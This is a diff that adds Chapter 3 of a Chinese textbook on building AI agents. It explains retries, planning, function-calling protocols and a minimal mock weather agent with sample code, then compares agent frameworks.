+        except PermissionError as e:
+            # 权限错误不重试
+            return {"ok": False, "error_type": "permission", "msg": str(e)}
+        except (TimeoutError, ConnectionError) as e:
+            # 网络错误重试
+            last_error = e
+            wait = 2 ** attempt + random.random()
+            print(f"  [重试 {attempt+1}] 网络错误: {e}, {wait:.1f}s 后")
+            time.sleep(wait)
+        except TypeError as e:
+            # 参数错误不重试（重试也没用）
+            return {"ok": False, "error_type": "args", "msg": str(e)}
+        except Exception as e:
+            # 业务错误，不重试
+            return {"ok": False, "error_type": "business", "msg": str(e)}
+    return {"ok": False, "error_type": "network", "msg": f"重试 {max_attempts} 次后失败: {last_error}"}</code></pre>
+          <p><strong>关键</strong>：把错误<strong>结构化</strong>返回（<code>error_type</code> + <code>msg</code>），LLM 看到结构化错误能更好地决策。</p>
+          <hr>
+          <h2 id="section-3.6">3.6 规划——Agent 的"项目经理"</h2>
+          <p>大脑有了、记忆有了、工具也有了——那"我该按什么顺序调用这些工具"呢？</p>
+          <p>这就是<strong>规划</strong>（Planning）的活。</p>
+          <h3>3.6.1 为什么需要规划</h3>
+          <p>假设用户说："<strong>帮我订明天去上海的机票和酒店</strong>"。一个没规划的 Agent 可能会这样：</p>
+          <pre><code class="language-text">轮 1: 调 search_flight() → 找到 5 个航班
+轮 2: 调 book_hotel() → 报错：没指定城市
+轮 3: 调 search_hotel() → 找到 20 个酒店
+轮 4: 调 book_hotel() → 报错：没指定日期
+...
+（10 轮后才开始真正预订）</code></pre>
+          <p><strong>有规划的 Agent</strong>会这样：</p>
+          <pre><code class="language-text">[规划阶段]
+目标: 订明天去上海的机票和酒店
+子任务 1: 确认上海酒店位置偏好
+子任务 2: 搜索明天到上海的航班
+子任务 3: 搜索上海的酒店
+子任务 4: 让用户选航班和酒店
+子任务 5: 预订
+
+[执行阶段]
+执行子任务 1 → ...</code></pre>
+          <p><strong>效率提升 50%+</strong>。</p>
+          <h3>3.6.2 三种规划范式</h3>
+          <table>
+          <thead><tr><th>范式</th><th>思路</th><th>何时用</th></tr></thead>
+          <tbody>
+          <tr><td><strong>Plan-and-Execute</strong></td><td>一次生成完整计划，然后逐步执行</td><td>任务可预测、步骤少（&lt; 10 步）</td></tr>
+          <tr><td><strong>ReAct</strong></td><td>边想边做，每步重新规划</td><td>任务灵活、可能出错</td></tr>
+          <tr><td><strong>Reflexion</strong></td><td>失败后反思，再重新规划</td><td>任务易错、需要试错</td></tr>
+          </tbody>
+          </table>
+          <p><strong>详细对比</strong>留到第 5 章和第 10 章。本章只需知道：<strong>规划是 Agent 区别于 Chatbot 的关键能力</strong>。</p>
+          <h3>3.6.3 规划器代码骨架</h3>
+          <pre><code class="language-python"># planner.py
+# 一个最小规划器
+
+class Task:
+    def __init__(self, name, deps=None, action=None):
+        self.name = name
+        self.deps = deps or []        # 依赖哪些子任务
+        self.action = action          # 实际执行函数
+        self.done = False
+        self.result = None
+
+class Planner:
+    def __init__(self, llm_call):
+        self.llm = llm_call
+        self.tasks = []
+
+    def plan(self, goal):
+        """让 LLM 把目标拆成子任务。"""
+        prompt = f"""把目标拆成子任务，每行一个，格式：- 任务名: 描述
+目标: {goal}
+子任务:"""
+        response = self.llm(prompt)
+        for line in response.strip().split("\n"):
+            if ":" in line:
+                name, desc = line.strip("- ").split(":", 1)
+                self.tasks.append(Task(name=name.strip(), action=desc.strip()))
+
+    def execute(self):
+        """按依赖顺序执行所有任务。"""
+        # 简化版：顺序执行
+        results = {}
+        for task in self.tasks:
+            print(f"[执行] {task.name}: {task.action}")
+            # 实际应该调工具
+            task.result = f"&lt;result of {task.name}&gt;"
+            task.done = True
+            results[task.name] = task.result
+        return results
+
+# 演示
+def mock_llm(prompt):
+    if "订明天去上海的机票和酒店" in prompt:
+        return """- 查航班: 搜索明天到上海的航班
+- 查酒店: 搜索上海的酒店
+- 用户选: 让用户选航班和酒店
+- 预订: 提交订单"""
+    return "- 任务1: 默认"
+
+planner = Planner(llm_call=mock_llm)
+planner.plan("订明天去上海的机票和酒店")
+print("\n=== 执行 ===")
+results = planner.execute()</code></pre>
+          <hr>
+          <h2 id="section-3.7">3.7 协议层——Function Calling / Tool Use</h2>
+          <p>工具和大脑怎么"对话"？靠 <strong>Function Calling 协议</strong>。</p>
+          <h3>3.7.1 协议总览</h3>
+          <p>三大协议都遵循同样的"四步循环"：</p>
+          <pre><code class="language-text">┌──────────────────────────────────────────┐
+│  1. 开发者：把工具定义发给 LLM            │
+│  2. LLM：决定要不要调、调哪个、传啥参数   │
+│  3. 开发者：执行工具，把结果喂回 LLM      │
+│  4. LLM：基于结果生成最终回答             │
+└──────────────────────────────────────────┘</code></pre>
+          <h3>3.7.2 OpenAI 协议</h3>
+          <pre><code class="language-python"># OpenAI Function Calling
+import openai
+
+tools = [{
+    "type": "function",
+    "function": {
+        "name": "get_weather",
+        "description": "查询天气",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "city": {"type": "string"}
+            }
+        }
+    }
+}]
+
+resp = openai.chat.completions.create(
+    model="gpt-4o",
+    messages=[{"role": "user", "content": "北京天气如何？"}],
+    tools=tools,
+)
+
+# LLM 决定调工具
+tool_call = resp.choices[0].message.tool_calls[0]
+print(f"工具: {tool_call.function.name}")
+print(f"参数: {tool_call.function.arguments}")
+# 输出: get_weather / {"city": "北京"}
+
+# 执行工具，把结果喂回
+messages = [
+    {"role": "user", "content": "北京天气如何？"},
+    resp.choices[0].message,                        # 模型说要调工具
+    {"role": "tool", "tool_call_id": tool_call.id,  # 工具结果
+     "content": '{"temp": 25, "condition": "晴"}'},
+]
+
+final = openai.chat.completions.create(
+    model="gpt-4o", messages=messages, tools=tools,
+)
+print(final.choices[0].message.content)
+# 输出: "北京今天 25 度，晴天。"</code></pre>
+          <h3>3.7.3 Anthropic 协议</h3>
+          <pre><code class="language-python"># Anthropic Tool Use
+import anthropic
+
+client = anthropic.Anthropic()
+tools = [{
+    "name": "get_weather",
+    "description": "查询天气",
+    "input_schema": {
+        "type": "object",
+        "properties": {"city": {"type": "string"}},
+        "required": ["city"]
+    }
+}]
+
+resp = client.messages.create(
+    model="claude-sonnet-4-5",
+    max_tokens=1024,
+    tools=tools,
+    messages=[{"role": "user", "content": "北京天气如何？"}],
+)
+
+# Claude 决定调工具
+for block in resp.content:
+    if block.type == "tool_use":
+        print(f"工具: {block.name}")
+        print(f"参数: {block.input}")
+        # 输出: get_weather / {"city": "北京"}</code></pre>
+          <h3>3.7.4 对比</h3>
+          <table>
+          <thead><tr><th>特性</th><th>OpenAI</th><th>Anthropic</th><th>Gemini</th></tr></thead>
+          <tbody>
+          <tr><td>工具定义位置</td><td><code>tools</code> 参数</td><td><code>tools</code> 参数</td><td><code>tools</code> 参数</td></tr>
+          <tr><td>工具名</td><td><code>tool.function.name</code></td><td><code>block.name</code></td><td><code>function_call.name</code></td></tr>
+          <tr><td>参数 schema</td><td><code>parameters</code></td><td><code>input_schema</code></td><td><code>parameters</code></td></tr>
+          <tr><td>调用 ID</td><td><code>tool_call_id</code></td><td><code>block.id</code></td><td>自带</td></tr>
+          <tr><td>多工具并行</td><td>✅</td><td>✅</td><td>✅</td></tr>
+          </tbody>
+          </table>
+          <p><strong>好消息</strong>：三家协议<strong>结构高度相似</strong>。学一个，另外两个 5 分钟就能上手。</p>
+          <hr>
+          <h2 id="section-3.8">3.8 拼起来：一个最小可运行的 Python Agent</h2>
+          <p>现在我们把四件套拼起来，写一个<strong>80-100 行的完整 Agent</strong>。</p>
+          <h3>3.8.1 任务设定</h3>
+          <p><strong>用户问</strong>："今天北京天气如何？适合穿什么？"</p>
+          <p><strong>Agent 要做的</strong>：</p>
+          <ol>
+          <li>调 <code>get_weather(city="北京")</code> 查天气</li>
+          <li>根据温度 + 天气状况决定穿衣建议</li>
+          <li>用自然语言回答用户</li>
+          </ol>
+          <h3>3.8.2 完整代码</h3>
+          <pre><code class="language-python"># minimal_agent.py
+# 拼齐大脑 + 记忆 + 工具 + 规划 的最小 Agent
+# 运行: python3 minimal_agent.py
+# 不依赖任何 LLM API（用 mock LLM，方便离线跑）
+
+import json
+import re
+from typing import List, Dict, Any
+
+# ============================================================
+# 1. 工具定义（Tools）
+# ============================================================
+TOOLS = [
+    {
+        "name": "get_weather",
+        "description": "查询指定城市的当前天气。参数: city (城市名)",
+        "parameters": {
+            "type": "object",
+            "properties": {"city": {"type": "string"}},
+            "required": ["city"]
+        }
+    }
+]
+
+def get_weather(city: str) -&gt; Dict[str, Any]:
+    """真实场景应该调天气 API。这里用 mock 数据。"""
+    mock_data = {
+        "北京": {"temp": 25, "condition": "晴"},
+        "上海": {"temp": 28, "condition": "多云"},
+        "广州": {"temp": 32, "condition": "雷阵雨"},
+    }
+    return mock_data.get(city, {"temp": 20, "condition": "未知"})
+
+TOOL_FUNCS = {"get_weather": get_weather}
+
+# ============================================================
+# 2. Mock LLM（离线可跑）
+# ============================================================
+def mock_llm(messages: List[Dict], tools: List = None) -&gt; Dict:
+    """模拟 LLM 的决策。真实场景换成 openai/Anthropic SDK。"""
+    last_user = messages[-1]["content"]
+    # 决策: 要不要调工具
+    if "天气" in last_user and tools:
+        # 提取城市
+        m = re.search(r"([\u4e00-\u9fa5]{2,})", last_user)
+        city = m.group(1) if m else "北京"
+        return {
+            "role": "assistant",
+            "content": None,
+            "tool_calls": [{
+                "id": "call_1",
+                "type": "function",
+                "function": {
+                    "name": "get_weather",
+                    "arguments": json.dumps({"city": city}, ensure_ascii=False)
+                }
+            }]
+        }
+    # 否则: 直接回答
+    return {"role": "assistant", "content": f"已为您查询，结果是 25 度晴。适合穿 T 恤。", "tool_calls": None}
+
+# ============================================================
+# 3. Agent 主循环
+# ============================================================
+class MinimalAgent:
+    def __init__(self, llm_fn, tools, tool_funcs, max_steps=5):
+        self.llm = llm_fn
+        self.tools = tools
+        self.tool_funcs = tool_funcs
+        self.max_steps = max_steps
+        # 短期记忆
+        self.history = [
+            {"role": "system", "content": "你是一个天气助手，能调 get_weather 工具。"}
+        ]
+
+    def _execute_tool(self, tool_call) -&gt; str:
+        """执行工具调用，返回 JSON 字符串。"""
+        name = tool_call["function"]["name"]
+        args = json.loads(tool_call["function"]["arguments"])
+        print(f"  [工具调用] {name}({args})")
+        result = self.tool_funcs[name](**args)
+        return json.dumps(result, ensure_ascii=False)
+
+    def run(self, user_msg: str) -&gt; str:
+        """Agent 主循环。"""
+        self.history.append({"role": "user", "content": user_msg})
+        for step in range(self.max_steps):
+            print(f"\n--- 第 {step+1} 步 ---")
+            print(f"  [历史消息数] {len(self.history)}")
+            # 1. LLM 决策
+            response = self.llm(self.history, self.tools)
+            self.history.append(response)
+            # 2. 如果要调工具
+            if response.get("tool_calls"):
+                for tool_call in response["tool_calls"]:
+                    result = self._execute_tool(tool_call)
+                    self.history.append({
+                        "role": "tool",
+                        "tool_call_id": tool_call["id"],
+                        "content": result
+                    })
+                continue   # 继续循环
+            # 3. 不调工具，返回最终回答
+            return response.get("content", "")
+        return "&lt;超出最大步数&gt;"
+
+# ============================================================
+# 4. 跑起来
+# ============================================================
+if __name__ == "__main__":
+    agent = MinimalAgent(
+        llm_fn=mock_llm,
+        tools=TOOLS,
+        tool_funcs=TOOL_FUNCS,
+    )
+    print("=" * 50)
+    print("最小 Agent 演示")
+    print("=" * 50)
+    answer = agent.run("今天北京天气如何？适合穿什么？")
+    print(f"\n=== 最终回答 ===\n{answer}")</code></pre>
+          <h3>3.8.3 运行结果</h3>
+          <pre><code class="language-text">==================================================
+最小 Agent 演示
+==================================================
+
+--- 第 1 步 ---
+  [历史消息数] 2
+  [工具调用] get_weather({'city': '今天北京天气如何'})
+
+--- 第 2 步 ---
+  [历史消息数] 4
+
+=== 最终回答 ===
+已为您查询，结果是 25 度晴。适合穿 T 恤。</code></pre>
+          <blockquote><strong>注意</strong>：上述 mock_llm 的城市提取只是<strong>示意</strong>（用最简正则），把"今天北京"也当城市名。真实 LLM（如 GPT-4o / Claude）会正确抽取 <code>city="北京"</code>。<strong>核心目的是演示主循环</strong>——换 mock 为真 LLM 后，城市提取会自动正确。</blockquote>
+          <p><strong>看，Agent 跑起来了</strong>。它：</p>
+          <ol>
+          <li>收到用户问题</li>
+          <li>决定调 <code>get_weather</code> 工具</li>
+          <li>拿到结果</li>
+          <li>给出穿衣建议</li>
+          </ol>
+          <p><strong>关键代码结构</strong>：</p>
+          <ul>
+          <li><code>TOOLS</code> —— 工具的"说明书"</li>
+          <li><code>mock_llm</code> —— 大脑（可替换成真 LLM）</li>
+          <li><code>MinimalAgent.run</code> —— 主循环（思考 → 调工具 → 观察 → 再思考）</li>
+          <li><code>self.history</code> —— 短期记忆</li>
+          </ul>
+          <p><strong>换成真实 LLM</strong>：把 <code>mock_llm</code> 换成 <code>openai.chat.completions.create</code> 或 <code>anthropic.messages.create</code>，<strong>其他代码一行不用改</strong>。</p>
+          <h3>3.8.4 调试 Agent 的 5 个常用技巧</h3>
+          <p>Agent 是非确定性系统——同一个问题可能跑出不同结果。下面 5 个技巧能帮你 debug：</p>
+          <ol>
+          <li><strong>打印每一步的 LLM 输入输出</strong>—— 99% 的 bug 在这里</li>
+          <li><strong>先固定 <code>temperature=0</code></strong>——减少"玄学"问题</li>
+          <li><strong>把 <code>mock_llm</code> 替换成真实 LLM 之前，先用 unit test 跑通 mock</strong>——避免一边写 LLM 逻辑一边写业务逻辑</li>
+          <li><strong>限制 <code>max_steps</code></strong>——避免 Agent 进入死循环把 token 烧光</li>
+          <li><strong>记录 trace 到 JSON 文件</strong>——事后可以 replay</li>
+          </ol>
+          <pre><code class="language-python">import json
+from datetime import datetime
+
+def trace_run(agent, user_msg, trace_file="trace.jsonl"):
+    """把 Agent run 的每一步记到 JSONL。"""
+    trace = {
+        "ts": datetime.now().isoformat(),
+        "user": user_msg,
+        "steps": []
+    }
+    # 拦截 history 变化，记每步
+    original_run = agent.run
+    def traced_run(msg):
+        agent.history.append({"role": "user", "content": msg})
+        for step in range(agent.max_steps):
+            trace["steps"].append({
+                "step": step,
+                "history_len": len(agent.history),
+                "messages": [m.get("content") for m in agent.history[-3:]]
+            })
+        return original_run(msg)
+    result = traced_run(user_msg)
+    trace["result"] = result
+    with open(trace_file, "a") as f:
+        f.write(json.dumps(trace, ensure_ascii=False) + "\n")
+    return result</code></pre>
+          <hr>
+          <h2 id="section-3.9">3.9 进阶：让 Agent 跑得更稳</h2>
+          <p>第 3.8 的 Agent 能跑，但生产环境会出各种问题。这一节讲 4 个最常见的"加固"手段。</p>
+          <h3>3.9.1 重试与超时</h3>
+          <pre><code class="language-python">import time
+from functools import wraps
+
+def retry(max_attempts=3, delay=1, backoff=2):
+    """指数退避重试装饰器。"""
+    def decorator(fn):
+        @wraps(fn)
+        def wrapper(*args, **kwargs):
+            for attempt in range(max_attempts):
+                try:
+                    return fn(*args, **kwargs)
+                except Exception as e:
+                    if attempt == max_attempts - 1:
+                        raise
+                    wait = delay * (backoff ** attempt)
+                    print(f"  [重试 {attempt+1}/{max_attempts}] {e}, {wait}s 后重试")
+                    time.sleep(wait)
+        return wrapper
+    return decorator
+
+@retry(max_attempts=3, delay=1)
+def call_external_api():
+    """可能失败的网络调用。"""
+    # ... 实际代码
+    pass</code></pre>
+          <h3>3.9.2 错误恢复</h3>
+          <p>Agent 调工具失败时，<strong>别让整个任务崩</strong>。给它一个机会自我修复：</p>
+          <pre><code class="language-python">def safe_execute_tool(tool_call):
+    try:
+        return self._execute_tool(tool_call)
+    except Exception as e:
+        # 把错误信息喂回 LLM，让它决定怎么办
+        return json.dumps({"error": str(e)})</code></pre>
+          <p>LLM 看到错误，可能：</p>
+          <ul>
+          <li>重试时换参数</li>
+          <li>选别的工具</li>
+          <li>改计划</li>
+          </ul>
+          <h3>3.9.3 Token 成本控制</h3>
+          <table>
+          <thead><tr><th>策略</th><th>怎么做</th><th>节省</th></tr></thead>
+          <tbody>
+          <tr><td><strong>Prompt 缓存</strong></td><td>同一 system prompt 多次复用</td><td>50-90%</td></tr>
+          <tr><td><strong>历史摘要</strong></td><td>让 LLM 把旧对话压缩成 200 字</td><td>30-50%</td></tr>
+          <tr><td><strong>模型降级</strong></td><td>简单任务用 Haiku，难的用 Opus</td><td>70%+</td></tr>
+          <tr><td><strong>工具降级</strong></td><td>能用确定性逻辑就别调 LLM</td><td>90%+</td></tr>
+          </tbody>
+          </table>
+          <p><strong>2026 年 Anthropic 和 OpenAI 都默认开启 prompt caching</strong>，这是最大头。</p>
+          <h3>3.9.4 可观测性</h3>
+          <p>Agent 是"非确定性"系统，<strong>没有 log 就没有 debug</strong>。</p>
+          <pre><code class="language-text">推荐工具：
+- LangSmith（LangChain 生态）
+- Langfuse（开源，可自部署）
+- Arize Phoenix（开源）
+- Helicone（API 层代理）
+- Braintrust（评测 + 观测一体）</code></pre>
+          <p>最小可用：把每个 trace（一次完整 Agent run）记下来，包括：</p>
+          <ul>
+          <li>输入（用户问题）</li>
+          <li>每步的 LLM 调用（prompt、completion、token 数）</li>
+          <li>每步的工具调用（参数、结果、耗时）</li>
+          <li>最终输出</li>
+          <li>总耗时 + 总 token</li>
+          </ul>
+          <hr>
+          <h2 id="section-3.10">3.10 2026 现状：四大件的最佳实践</h2>
+          <h3>3.10.1 主流框架的组件映射</h3>
+          <table>
+          <thead><tr><th>框架</th><th>LLM 大脑</th><th>记忆</th><th>工具</th><th>规划</th></tr></thead>
+          <tbody>
+          <tr><td><strong>LangGraph</strong></td><td>任意</td><td>Checkpointer + Store</td><td>ToolNode</td><td>图（条件边）</td></tr>
+          <tr><td><strong>AutoGen</strong></td><td>任意</td><td>消息历史</td><td>FunctionTool</td><td>GroupChat</td></tr>
+          <tr><td><strong>CrewAI</strong></td><td>任意</td><td>Agent 间共享</td><td>Tool 基类</td><td>Role + Task</td></tr>
+          <tr><td><strong>Agno</strong></td><td>任意</td><td>内置 sqlite/vector</td><td>Decorator 工具</td><td>Step / Loop</td></tr>
+          <tr><td><strong>OpenAI Agents SDK</strong></td><td>OpenAI</td><td>Session</td><td>function_tool</td><td>handoff / guardrail</td></tr>
+          <tr><td><strong>LlamaIndex</strong></td><td>任意</td><td>ChatMemoryBuffer</td><td>QueryEngineTool</td><td>ReActAgent / AgentWorkflow</td></tr>
+          </tbody>
+          </table>
+          <p><strong>共同点</strong>：所有框架都围绕"四大件"做抽象，只是<strong>抽象方式</strong>不同。</p>
+          <h3>3.10.2 什么时候用框架，什么时候自己写</h3>
+          <p><strong>用框架</strong>：</p>
+          <ul>
+          <li>团队 &gt; 2 人</li>
+          <li>项目生命周期 &gt; 3 个月</li>
+          <li>需要可观测性、生产部署</li>
+          <li>想用现成的最佳实践</li>
+          </ul>
+          <p><strong>自己写</strong>：</p>
+          <ul>
+          <li>学习目的（理解原理）</li>
+          <li>单人小项目</li>
+          <li>框架的抽象和你需求严重不匹配</li>
+          <li>极致性能要求（框架有 overhead）</li>
+          </ul>
+          <p><strong>经验法则</strong>：<strong>先自己写一遍，再上框架</strong>。否则你会被框架的"魔法"困住——出问题不知道是 prompt 的问题还是框架的 bug。</p>
+          <h3>3.10.3 反模式</h3>
+          <table>
+          <thead><tr><th>反模式</th><th>为什么坏</th><th>怎么做才对</th></tr></thead>
+          <tbody>
+          <tr><td><strong>把四大件全塞进 prompt</strong></td><td>prompt 越长，模型越蠢</td><td>prompt 只放"目标"和"输出格式"，其他靠代码</td></tr>
+          <tr><td><strong>没有短期记忆管理</strong></td><td>context 爆炸</td><td>滑动窗口 + 关键事实外提</td></tr>
+          <tr><td><strong>工具描述不清</strong></td><td>模型选错工具</td><td>名字动词开头，description 写"何时用"</td></tr>
+          <tr><td><strong>没规划直接 ReAct</strong></td><td>效率低、token 费</td><td>多步任务先规划再执行</td></tr>
+          <tr><td><strong>没超时没重试</strong></td><td>一个工具卡死 = 整个 Agent 卡死</td><td>每个工具加 timeout + retry</td></tr>
+          <tr><td><strong>没 log</strong></td><td>出问题没法 debug</td><td>每个 Agent run 留 trace</td></tr>
+          </tbody>
+          </table>
+          <h3>3.10.4 框架选型决策树</h3>
+          <p>实际选框架时，按这个顺序问自己：</p>
+          <pre><code class="language-text">Q1: 你的目标语言是？
+├── Python → 跳过 Q2
+└── TypeScript / JavaScript → 略窄，LangGraph.js / Vercel AI SDK
+
+Q2: 团队规模？
+├── 1-2 人 → Agno / smolagents（轻量）
+└── 3+ 人 → LangGraph（生态全）
+
+Q3: 任务复杂度？
+├── 单 Agent 工具调用 → OpenAI Agents SDK / smolagents
+├── 多 Agent 协作 → AutoGen / CrewAI
+└── 复杂状态机 → LangGraph
+
+Q4: 部署目标？
+├── 云端 SaaS → 任何框架都行
+├── 边缘 / 私有化 → smolagents / 自研
+└── 移动端 → 一般用云 API 调 LLM
+
+Q5: 调试需求？
+├── 需要详细 trace → LangGraph + LangSmith
+└── 简单日志即可 → 任何框架</code></pre>
+          <p><strong>最大坑</strong>：一开始就上最复杂的框架。<strong>先从最简单的开始（OpenAI Agents SDK 或 smolagents），遇到瓶颈再升级</strong>。</p>
+          <hr>
+          <h2 id="section-3.11">3.11 本章小结</h2>
+          <p>这一章我们把一个 Agent 拆成了四件套，又拼回去。8 条关键收获：</p>
+          <ol>
+          <li><strong>四大件</strong>：LLM 大脑 + 记忆 + 工具 + 规划，缺一不可。</li>
+          <li><strong>LLM 选型</strong>：80% 场景用 Claude Sonnet 4 / GPT-4o，复杂任务加推理模型（o3 / DeepSeek-R1）。</li>
+          <li><strong>短期记忆</strong>：context window 满了会丢消息，需要滑动窗口 + 关键事实外提。</li>
+          <li><strong>长期记忆</strong>：向量数据库做语义检索（Chroma / Qdrant / pgvector），知识图谱做关系推理（Neo4j）。</li>
+          <li><strong>工具设计</strong>：description 决定 LLM 是否会选——<strong>写得越清，调用越准</strong>。</li>
+          <li><strong>规划</strong>：多步任务先 Plan-and-Execute，灵活任务用 ReAct。</li>
+          <li><strong>协议层</strong>：OpenAI / Anthropic / Gemini 的 Function Calling 结构相似，学一个通三个。</li>
+          <li><strong>先自己写一遍 Agent，再上框架</strong>——理解原理比用工具重要。</li>
+          </ol>
+          <p><strong>关键概念摘要</strong>：</p>
+          <ul>
+          <li>LLM 大脑 / 大模型选型 / 推理模型</li>
+          <li>Temperature / Top-p / Max tokens</li>
+          <li>Context window / 滑动窗口 / 摘要压缩</li>
+          <li>Embedding / 向量数据库 / 语义检索</li>
+          <li>知识图谱 / GraphRAG</li>
+          <li>工具描述 / JSON Schema / 安全沙箱</li>
+          <li>Plan-and-Execute / ReAct / Reflexion</li>
+          <li>Function Calling / Tool Use / 多工具并行</li>
+          <li>Prompt caching / 模型降级 / 可观测性</li>
+          </ul>
+          <hr>
+          <h3>关键人物速查</h3>
+          <table>
+          <thead><tr><th>人物</th><th>机构</th><th>关键贡献</th></tr></thead>
+          <tbody>
+          <tr><td><strong>Andrej Karpathy</strong></td><td>OpenAI / Tesla</td><td>早期 LLM 工具调用范式（2023）</td></tr>
+          <tr><td><strong>Harrison Chase</strong></td><td>LangChain / LangGraph</td><td>LangChain 框架，工具调用标准化</td></tr>
+          <tr><td><strong>Jerry Liu</strong></td><td>LlamaIndex</td><td>RAG + Agent 框架</td></tr>
+          <tr><td><strong>Chi Wang</strong></td><td>DeepMind / AutoGen</td><td>AutoGen 多 Agent 框架</td></tr>
+          <tr><td><strong>Joao Moura</strong></td><td>CrewAI</td><td>CrewAI 角色化多 Agent 框架</td></tr>
+          <tr><td><strong>Lilian Weng</strong></td><td>OpenAI</td><td>"LLM Powered Autonomous Agents" 经典博客</td></tr>
+          <tr><td><strong>Simon Willison</strong></td><td>个人</td><td>Web Agent 推广者</td></tr>
+          <tr><td><strong>Swyx</strong></td><td>—</td><td>Agent 概念布道</td></tr>
+          </tbody>
+          </table>
+          <h3>进一步阅读</h3>
+          <ol>
+          <li><strong>Anthropic</strong>: "Building Effective Agents" (2024.12) — &lt;https://www.anthropic.com/research/building-effective-agents&gt;</li>
+          <li><strong>OpenAI</strong>: "A Practical Guide to Building Agents" (2025.4) — &lt;https://openai.com/index/building-agents/&gt;</li>
+          <li><strong>Lilian Weng</strong>: "LLM Powered Autonomous Agents" (2023.6) — &lt;https://lilianweng.github.io/posts/2023-06-23-agent/&gt;</li>
+          <li><strong>HuggingFace</strong>: smol-course 的 Agent 章节（2025）</li>
+          <li><strong>Anthropic 文档</strong>: Tool Use 官方指南 — &lt;https://docs.anthropic.com/en/docs/tool-use&gt;</li>
+          <li><strong>LangChain 文档</strong>: LangGraph 概念手册 — &lt;https://langchain-ai.github.io/langgraph/concepts/&gt;</li>
+          <li><strong>DeepLearning.AI</strong>: Andrew Ng 的 Agentic AI 短课（2024-2025）</li>
+          </ol>
+          <blockquote>下一章（第 4 章）我们会把目光从"组件"转向"框架"——逐一拆解 LangChain / LangGraph / AutoGen / CrewAI / LlamaIndex / Agno / OpenAI Agents SDK 这 7 个主流框架，看它们怎么把四大件落地成代码。</blockquote>
+
+          <hr>
+          <div class="chapter-summary">
+            <h2 id="section-extra-next">下一章预告</h2>
+            <blockquote>第 4 章《主流 Agent 框架纵览——LangChain、LangGraph、AutoGen、CrewAI、LlamaIndex、Agno、OpenAI Agents SDK》：拆开 7 个主流框架，看它们怎么把"四大件"落地成代码。</blockquote>
+
+      </article>
+    </div>
+  </div>
+
+  <!-- ==================== CHAPTER PAGER ==================== -->
+  <nav class="chapter-pager" style="display:flex; justify-content:space-between; max-width:920px; margin:40px auto 60px; padding:0 20px;">
+    <a href="ch02.html" class="pager-prev" style="padding:12px 20px; border:1px solid rgba(192,38,211,0.4); border-radius:8px; color:var(--book-accent-fg, #c026d3); text-decoration:none;">
+      ← 上一章：Agent 简史（第 2 章）
+    </a>
+    <a href="ch04.html" class="pager-next" style="padding:12px 20px; border:1px solid rgba(192,38,211,0.4); border-radius:8px; color:var(--book-accent-fg, #c026d3); text-decoration:none; opacity:0.5; pointer-events:none;">
+      下一章：主流框架纵览（第 4 章，未发布）→
+    </a>
+  </nav>
+
+  <!-- TOC Toggle Button (mobile) -->
+  <button class="toc-toggle" id="toc-toggle" aria-label="切换目录">
+    📑
+  </button>
+
+  <!-- Back to Top -->
+  <button class="fab-back-top" id="back-to-top" aria-label="回到顶部">
+    ↑
+  </button>
+
+  <!-- ==================== FOOTER ==================== -->
+  <footer class="site-footer">
+    <div class="footer-content">
+      <div class="footer-brand">
+        <h3>🤖 AGENT开发从入门到精通</h3>
+        <p>
+          一本系统性的 AI Agent 开发中文教材。
+          从 1966 ELIZA 到 2026 多 Agent 协议爆发，
+          覆盖 Agent 基础、核心技术、多 Agent 协作、实战项目与前沿展望。
+        </p>
+      </div>
+      <div class="footer-col">
+        <h4>导航</h4>
+        <ul>
+          <li><a href="../index.html">首页</a></li>
+          <li><a href="../index.html#chapters">章节总览</a></li>
+          <li><a href="ch01.html">第1章</a></li>
+          <li><a href="ch02.html">第2章</a></li>
+          <li><a href="ch03.html">第3章</a></li>
+          <li><a href="../index.html#progress">阅读进度</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>资源</h4>
+        <ul>
+          <li><a href="#">GitHub 仓库（待建）</a></li>
+          <li><a href="#">反馈与建议</a></li>
+          <li><a href="#">参考文献</a></li>
+          <li><a href="#">配套代码</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p>&copy; 2026 《AGENT开发从入门到精通》. 保留所有权利.</p>
+      <p>Powered by 🤖 Agentic AI &mdash; 让 LLM 真正"动手做事"</p>
+    </div>
+  </footer>
+
+  <script src="/assets/js/book.js"></script>
+  <script src="/assets/js/site.js"></script>
+</body>
+</html>
